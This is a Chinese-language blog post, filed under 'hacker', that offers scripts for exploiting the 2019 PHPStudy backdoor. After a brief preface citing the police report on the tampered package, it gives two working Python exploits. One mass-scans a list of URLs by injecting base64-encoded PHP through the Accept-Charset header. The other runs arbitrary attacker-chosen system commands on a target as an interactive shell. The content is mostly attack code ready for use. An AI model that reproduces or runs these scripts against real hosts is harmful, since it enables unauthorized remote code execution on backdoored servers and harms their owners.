---
layout: post
title: PHPStudy后门rec批量利用脚本
tags:
  - PHPStudy
categories:
  - hacker
abbrlink: 12551
---
### 前言

北京时间9月20日，杭州公安发布《杭州警方通报打击涉网违法犯罪暨‘净网2019’专项行动战果》一文，文章曝光了国内知名PHP调试环境程序集成包“PhpStudy软件”遭到黑客篡改并植入“后门”。截至案发，近百万PHP用户中超过67万用户已被黑客控制，并大肆盗取账号密码、聊天记录、设备码类等敏感数据多达10万多组，非法牟利600多万元。

<!--more-->

### 批量检测

```python

import base64

import requests

import threading

import threadpool

from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

files=input('files:\n')

def write_shell(url):

    payload = "echo md5(123);"

    payload = base64.b64encode(payload.encode('utf-8'))

    headers = {

    'Upgrade-Insecure-Requests': '1',

    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',

    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',

    'Accept-Language': 'zh-CN,zh;q=0.9',

    'accept-charset': payload,

    'Accept-Encoding': 'gzip,deflate',

    'Connection': 'close',

}

    try:

        r = requests.get(url=url+'/index.php', headers=headers, verify=False,timeout=10)

        if "202cb962ac59075b964b07152d234b70" in r.text:

            print ('[ + ] BackDoor successful: '+url+'===============[ + ]\n')

            with open(files+'.success.txt','a') as f:

                    f.write(url+'\n')

        else:

            print ('[ - ] BackDoor failed: '+url+'[ - ]\n')

    except:

        print ('[ - ] Timeout: '+url+' [ - ]\n')



def main():

    with open(files,'r') as f:

        lines = f.read().splitlines()

        task_pool=threadpool.ThreadPool(10)

        requests=threadpool.makeRequests(write_shell,lines)

    for req in requests:

        task_pool.putRequest(req)

        task_pool.wait()

if __name__ == '__main__':

    main()
```

### 交互Shell

```python

import base64
import requests
import threading
import threadpool
import re

print("======Phpstudy Backdoor Exploit---os-shell============\n")
print("===========By  Qing=================\n")
print("=====Blog：https://www.cnblogs.com/-qing-/==\n")

def os_shell(url,headers,payload):
    try:
        r = requests.get(url=url+'/phpinfo.php',headers=headers,verify=False,timeout=10)
        # print(r.text)
        res = re.findall("qing(.*?)qing",r.text,re.S)
        print("[ + ]===========The Response:==========[ + ]\n")
        res = "".join(res)
        print(res)
    except:
        print("[ - ]===========Failed! Timeout...==========[ - ]\n")

def main():
    url = input("input the Url , example:\"http://127.0.0.1/\"\n")
    payload = input("input the payload , default:echo system(\"whoami\");\n")
    de_payload = "echo \"qing\";system(\"whoami\");echo \"qing\";"
    if payload.strip() == '':
        payload = de_payload
    payload = "echo \"qing\";"+payload+"echo \"qing\";"
    payload = base64.b64encode(payload.encode('utf-8'))
    payload = str(payload, 'utf-8')
    headers = {
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'accept-charset': payload,
    'Accept-Encoding': 'gzip,deflate',
    'Connection': 'close',
    }
    os_shell(url=url,headers=headers,payload=payload)
if __name__ == '__main__':
    main()

```